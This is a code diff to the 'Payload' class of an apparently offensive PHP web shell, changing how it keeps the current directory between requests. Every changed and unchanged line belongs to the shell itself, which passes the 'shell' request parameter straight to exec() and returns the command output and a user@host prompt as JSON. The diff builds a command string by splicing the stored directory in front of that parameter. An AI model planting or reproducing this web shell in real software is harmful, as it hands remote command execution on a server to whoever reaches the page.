@@ -31,23 +31,25 @@ class Payload{
 // use sessions for some conveniences, like preserving the CWD
 session_start();
 
+$cwd = '.';
 if(isset($_SESSION['cwd'])){
-    chdir("{$_SESSION['cwd']}");
+    $cwd = $_SESSION['cwd'];
 }
 
-// assemble the prompt context
-$whoami          =  trim(`whoami`);
-$cwd             =  getcwd();
-$hostname        =  gethostname();
-$line_terminator =  ($whoami ===  'root') ? '#' : '$' ;
-$prompt_context  =  "{$whoami}@{$hostname}:$cwd{$line_terminator}";
 
 // generate the output
 $output = array();
 
-$command = $_REQUEST['shell'] . " 2>&1";
+$command = "cd $cwd; " . $_REQUEST['shell'] . " 2>&1; pwd";
 exec($command, $output);
+$cwd = array_pop($output);
 $output = join($output, "\n");
+
+// assemble the prompt context
+$whoami          =  trim(`whoami`);
+$hostname        =  gethostname();
+$line_terminator =  ($whoami ===  'root') ? '#' : '$' ;
+$prompt_context  =  "{$whoami}@{$hostname}:$cwd{$line_terminator}";
 
 // also need to redirect stderr to stdout
 $error = '';
@@ -57,12 +59,10 @@ $response = array(
     'error'          => $error,
 );
 
-// save the CWD for convenience
-// @todo @bug: for some reason, this is borked
+// save the cwd
 $_SESSION['cwd'] = $cwd;
 
 $json = json_encode($response);
 echo $json;
     
-
 die();
